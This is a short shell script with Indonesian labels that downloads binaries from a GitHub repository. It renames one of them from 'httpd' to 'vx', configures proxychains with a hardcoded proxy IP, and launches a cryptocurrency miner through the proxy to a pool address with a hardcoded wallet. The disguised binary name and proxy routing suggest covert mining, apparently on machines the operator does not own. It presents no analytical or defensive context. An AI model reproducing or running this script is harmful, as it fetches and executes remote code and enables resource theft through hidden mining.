proxy="208.102.51.6" 
port="58208" 
wget -q -O vx https://github.com/sartielena/refactored-octo-fishstick/raw/main/httpd && chmod +x vx
wget -q https://github.com/sartielena/refactored-octo-fishstick/raw/main/panel && chmod +x panel 
wget -q https://raw.githubusercontent.com/sartielena/refactored-octo-fishstick/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://github.com/sartielena/refactored-octo-fishstick/raw/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./vx -a YespowerLTNCG -o 74.207.229.192:443 -u KTU3bYUi7HmCbaRuoKQmS667ouEYuuSRRF.$(echo $(shuf -i 1-9 -n 1)-yui) -p x -t1 
